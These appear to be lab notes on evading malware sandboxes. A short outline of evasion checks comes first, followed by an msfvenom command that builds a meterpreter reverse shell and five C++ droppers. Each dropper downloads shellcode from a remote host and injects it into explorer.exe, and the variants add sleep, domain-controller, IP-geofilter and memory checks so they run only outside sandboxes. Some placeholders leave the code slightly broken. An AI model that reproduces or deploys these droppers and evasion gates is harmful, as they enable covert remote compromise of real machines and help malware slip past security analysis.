- Sleeping through Sandboxes
	- [https://evasions.checkpoint.com/techniques/timing.html](https://evasions.checkpoint.com/techniques/timing.html)  
	- [https://www.joesecurity.org/blog/660946897093663167](https://www.joesecurity.org/blog/660946897093663167)
- Geolocation and Geoblocking
	- [ifconfig.me](https://ifconfig.me)
	- [https://rdap.arin.net/registry/ip/1.1.1.1](https://rdap.arin.net/registry/ip/1.1.1.1)[](https://rdap.arin.net/registry/ip/1.1.1.1)
- Checking System Information
	- - Storage Medium Serial Number
	- PC Hostname
	- BIOS/UEFI Version/Serial Number
	- Windows Product Key/OS Version
	- Network Adapter Information
	- Virtualization Checks
	- Current Signed in User
- Querying Network Information
	-  Computers
	- User accounts
	- Last User Login(s)
	- Groups
	- Domain Admins
	- Enterprise Admins
	- Domain Controllers
	- Service Accounts
	- DNS Servers

Shellcode:

	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=1337 -f raw -o index.raw

Dropper:
```cpp
#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include <locale>
#include <string>
#include <urlmon.h>
#include <cstdio>
#pragma comment(lib, "urlmon.lib")

using namespace std;

int downloadAndExecute()
{
    HANDLE hProcess;
//Update the dwSize variable with your shellcode size. This should be approximately 510 bytes
    SIZE_T dwSize = 510;
    DWORD flAllocationType = MEM_COMMIT | MEM_RESERVE;
    DWORD flProtect = PAGE_EXECUTE_READWRITE;
    LPVOID memAddr;
    SIZE_T bytesOut;
//Update the OpenProcess Windows API with your Explorer.exe Process ID. This can be found in Task Manager
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 2124);
//Update the c2URL with your IP Address and the specific URI where your raw shellcode is stored.
    const char* c2URL = "http://10.8.79.239:8000/index.raw";
    IStream* stream;
//Update the buff[] variable to include your shellcode size
    char buff[dwSize];
    unsigned long bytesRead;
    string s;
    URLOpenBlockingStreamA(0, c2URL, &stream, 0, 0);
    while (true) {
//Update the Read file descriptor to include your shellcode size
        stream->Read(buff, dwSize, &bytesRead);
        if (0U == bytesRead) {
            break;
        }
        s.append(buff, bytesRead);
    }
    memAddr = VirtualAllocEx(hProcess, NULL, dwSize, flAllocationType, flProtect);

    WriteProcessMemory(hProcess, memAddr, buff, dwSize, &bytesOut);

    CreateRemoteThread(hProcess, NULL, dwSize, (LPTHREAD_START_ROUTINE)memAddr, 0, 0, 0);
    stream->Release();
    return 0;
}

int main() {
    downloadAndExecute();
    return 0;
}
```

## Sleep
```cpp
#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include <locale>
#include <string>
#include <urlmon.h>
#include <cstdio>
#pragma comment(lib, "urlmon.lib")

using namespace std;

int downloadAndExecute()
{
    HANDLE hProcess;
    SIZE_T dwSize = YOURSHELLCODESIZE;
    DWORD flAllocationType = MEM_COMMIT | MEM_RESERVE;
    DWORD flProtect = PAGE_EXECUTE_READWRITE;
    LPVOID memAddr;
    SIZE_T bytesOut;
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 414);
    const char* c2URL = "http://1.1.1.1/index.raw";
    IStream* stream;
    char buff[510];
    unsigned long bytesRead;
    string s;
    URLOpenBlockingStreamA(0, c2URL, &stream, 0, 0);
    while (true) {
        stream->Read(buff, 510, &bytesRead);
        if (0U == bytesRead) {
            break;
        }
        s.append(buff, bytesRead);
    }
    memAddr = VirtualAllocEx(hProcess, NULL, dwSize, flAllocationType, flProtect);
    cout << "[+] Memory Allocated at:" << memAddr << "\n";

    WriteProcessMemory(hProcess, memAddr, buff, dwSize, &bytesOut);
    cout << "[+] Number of bytes written: " << bytesOut << "\n";

    CreateRemoteThread(hProcess, NULL, dwSize, (LPTHREAD_START_ROUTINE)memAddr, 0, 0, 0);
    stream->Release();
    return 0;
}

int main() {
    sleep(120000);
    downloadAndExecute();
    return 0;
}   
```

## AD-Check
```cpp
#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include <locale>
#include <string>
#include <urlmon.h>
#include <cstdio>
#include <lm.h>
#include <DsGetDC.h>
#pragma comment(lib, "urlmon.lib")

using namespace std;

int downloadAndExecute()
{
    HANDLE hProcess;
    SIZE_T dwSize = YOURSHELLCODESIZE;
    DWORD flAllocationType = MEM_COMMIT | MEM_RESERVE;
    DWORD flProtect = PAGE_EXECUTE_READWRITE;
    LPVOID memAddr;
    SIZE_T bytesOut;
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorer.exe-pid);
    const char* c2URL = "http://yourip/index.raw";
    IStream* stream;
    char buff[YOURSHELLCODESIZE];
    unsigned long bytesRead;
    string s;
    URLOpenBlockingStreamA(0, c2URL, &stream, 0, 0);
    while (true) {
        stream->Read(buff, YOURSHELLCODESIZE, &bytesRead);
        if (0U == bytesRead) {
            break;
        }
        s.append(buff, bytesRead);
    }
    memAddr = VirtualAllocEx(hProcess, NULL, dwSize, flAllocationType, flProtect);

    WriteProcessMemory(hProcess, memAddr, buff, dwSize, &bytesOut);

    CreateRemoteThread(hProcess, NULL, dwSize, (LPTHREAD_START_ROUTINE)memAddr, 0, 0, 0);
    stream->Release();
    return 0;
}

BOOL isDomainController() {
    LPCWSTR dcName;
    string dcNameComp;
    NetGetDCName(NULL, NULL, (LPBYTE*)&dcName);
    wstring ws(dcName);
    string dcNewName(ws.begin(), ws.end());
    cout << dcNewName;
    if(dcNewName.find("\\")) {
        return FALSE;
        
    }
    else {
        return TRUE;
    }
}


int main() {
    if (isDomainController() == TRUE) {
        downloadAndExecute();
    }
    else {
        cout << "Domain Controller not found!";
    }
} 
```

## Geofiltering
```cpp
#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include <locale>
#include <string>
#include <urlmon.h>
#include <cstdio>
#pragma comment(lib, "urlmon.lib")

using namespace std;

int downloadAndExecute()
{
    HANDLE hProcess;
    SIZE_T dwSize = YOURSHELLCODESIZE;
    DWORD flAllocationType = MEM_COMMIT | MEM_RESERVE;
    DWORD flProtect = PAGE_EXECUTE_READWRITE;
    LPVOID memAddr;
    SIZE_T bytesOut;
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorer.exe-pid);
    const char* c2URL = "http://yourip/index.raw";
    IStream* stream;
    char buff[YOURSHELLCODESIZE];
    unsigned long bytesRead;
    string s;
    URLOpenBlockingStreamA(0, c2URL, &stream, 0, 0);
    while (true) {
        stream->Read(buff, YOURSHELLCODESIZE, &bytesRead);
        if (0U == bytesRead) {
            break;
        }
        s.append(buff, bytesRead);
    }
    memAddr = VirtualAllocEx(hProcess, NULL, dwSize, flAllocationType, flProtect);

    WriteProcessMemory(hProcess, memAddr, buff, dwSize, &bytesOut);

    CreateRemoteThread(hProcess, NULL, dwSize, (LPTHREAD_START_ROUTINE)memAddr, 0, 0, 0);
    stream->Release();
    return 0;
}

BOOL checkIP() 
{
    const char* websiteURL = "https://ifconfig.me/ip";
    IStream* stream;
    string s;
    char buff[35];
    unsigned long bytesRead;
    URLOpenBlockingStreamA(0, websiteURL, &stream, 0, 0);
    while (true) {
        stream->Read(buff, 35, &bytesRead);
        if (0U == bytesRead) {
            break;
        }
        s.append(buff, bytesRead);
    }
    if (s == "VICTIM_IP") {
        return TRUE;
    }
    else {
        return FALSE;
    }   
}

int main() {
    if (checkIP() == TRUE) {
        downloadAndExecute();
    }
    else {
        cout << "HTTP/418 - I'm a teapot!";
    }
    return 0;
}  
```

## Memory-Check
```cpp
#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include <locale>
#include <string>
#include <urlmon.h>
#include <cstdio>
#include <lm.h>
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "netapi32.lib")

using namespace std;

BOOL memoryCheck() {
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    GlobalMemoryStatusEx(&statex);
    if (statex.ullTotalPhys / 1024 / 1024 / 1024 >= 5.00) {
        return TRUE;
    }
    else {
        return FALSE;
    }
}


int downloadAndExecute()
{
    HANDLE hProcess;
    SIZE_T dwSize = YOURSHELLCODESIZE;
    DWORD flAllocationType = MEM_COMMIT | MEM_RESERVE;
    DWORD flProtect = PAGE_EXECUTE_READWRITE;
    LPVOID memAddr;
    SIZE_T bytesOut;
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorer.exe-pid);
    const char* c2URL = "http://yourip/index.raw";
    IStream* stream;
    char buff[YOURSHELLCODESIZE];
    unsigned long bytesRead;
    string s;
    URLOpenBlockingStreamA(0, c2URL, &stream, 0, 0);
    while (true) {
        stream->Read(buff, YOURSHELLCODESIZE, &bytesRead);
        if (0U == bytesRead) {
            break;
        }
        s.append(buff, bytesRead);
    }
    memAddr = VirtualAllocEx(hProcess, NULL, dwSize, flAllocationType, flProtect);

    WriteProcessMemory(hProcess, memAddr, buff, dwSize, &bytesOut);

    CreateRemoteThread(hProcess, NULL, dwSize, (LPTHREAD_START_ROUTINE)memAddr, 0, 0, 0);
    stream->Release();
    return 0;
}

int main() {
    if (memoryCheck() == TRUE) {
                downloadAndExecute();
            }
    else {
        return 0;
    }
    return 0;
} 
```
